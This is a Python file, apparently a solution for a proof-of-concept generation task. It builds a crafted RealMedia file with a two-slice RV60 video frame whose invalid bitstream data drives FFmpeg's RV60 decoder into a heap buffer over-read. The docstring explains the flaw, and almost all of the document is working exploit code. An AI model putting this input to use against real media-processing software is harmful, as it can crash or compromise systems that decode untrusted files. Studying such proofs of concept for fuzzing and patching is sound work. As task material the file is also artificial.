import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a heap buffer overflow in FFmpeg's RV60 decoder.

        The vulnerability exists in the slice decoding logic. When multiple slices are
        present in a frame, the GetBitContext for a slice is initialized with a size
        that extends to the end of the entire frame buffer, rather than to the start
        of the next slice. This allows a read past the end of the current slice's data.

        This PoC constructs a minimal RealMedia (.rm) file with an RV60 video stream.
        The video frame is configured to have two slices.
        - The first slice contains invalid VLC data (0xFF bytes), which forces the
          bitstream reader to read ahead, looking for a valid code.
        - Because the GetBitContext is initialized with an overly large size, the
          reader is allowed to read past the end of the first slice's actual data,
          past the resync marker, and eventually past the end of the allocated
          frame buffer, triggering a heap buffer overflow.
        """

        # Part 1: RMF Headers (108 bytes)
        # The .RMF header section defines the file structure and properties.
        # It contains a root object and two chunks: PROP and MDPR.
        # Total size is calculated to be 108 bytes.

        # RMF root object (16 bytes)
        rmf_header = b'.RMF'             # Magic number
        rmf_header += b'\x00\x00\x00\x6C' # Header section size (108)
        rmf_header += b'\x00\x01\x00\x00' # File version
        rmf_header += b'\x00\x00\x00\x02' # Number of headers (PROP, MDPR)

        # PROP (Properties) object (28 bytes)
        prop_chunk = b'PROP'             # Chunk ID
        prop_chunk += b'\x00\x00\x00\x1C' # Chunk size (28)
        prop_chunk += b'\x00\x00'          # Chunk version
        prop_chunk += b'\x00' * 18         # Zeroed out properties

        # MDPR (Media Properties) object (64 bytes)
        mdpr_chunk = b'MDPR'             # Chunk ID
        mdpr_chunk += b'\x00\x00\x00\x40' # Chunk size (64)
        mdpr_chunk += b'\x00\x00'          # Chunk version
        
        mdpr_data = b'\x00\x00'          # Stream ID
        mdpr_data += b'\x00' * 20         # Zeroed out media properties
        mdpr_data += b'\x00'              # Stream name length (0)
        mdpr_data += b'\x00'              # MIME type length (0)
        mdpr_data += b'\x00\x00\x00\x1A'  # Type-specific data length (26)
        
        # Type-specific data (RV60 header, 26 bytes)
        rv60_header = b'\x01\x00\x00\x00'  # Sub-header version
        rv60_header += b'RV60'             # FourCC
        rv60_header += b'\x00\x10\x00\x10' # Width=16, Height=16
        rv60_header += b'\x00\x18'         # Bits per pixel
        rv60_header += b'\x00' * 8         # Unknown/padding
        rv60_header += b'\x01'             # CRITICAL: num_slices_minus_1 = 1 (enables 2 slices)
        rv60_header += b'\x00' * 3         # Padding
        
        mdpr_data += rv60_header
        mdpr_chunk += mdpr_data

        headers = rmf_header + prop_chunk + mdpr_chunk

        # Part 2: DATA chunk header (14 bytes)
        data_header = b'DATA'             # Chunk ID
        data_header += b'\x00\x00\x00\x00' # Chunk size (0 = until EOF)
        data_header += b'\x00\x00'          # Chunk version
        data_header += b'\x00\x00\x00\x01' # Number of packets (1)

        # Part 3: Packet (9 byte header + 18 byte payload)
        
        # Packet header (9 bytes)
        packet_payload_len = 18
        packet_header = b'\x00\x00'          # Stream ID
        packet_header += b'\x00\x00\x00\x00' # Timestamp
        packet_header += b'\x00'              # Packet group
        packet_header += struct.pack('>H', packet_payload_len) # Length

        # Packet payload (18 bytes)
        payload = b''
        payload += b'\x80\x00'            # Minimal I-frame header
        payload += b'\xff' * 12           # Slice 1: Invalid VLC data to cause over-read
        payload += b'\x00\x01'            # Slice 1/2 boundary: Resync marker (15 zeros, 1 one)
        payload += b'\x00\x00'            # Slice 2: Dummy data

        poc = headers + data_header + packet_header + payload

        return poc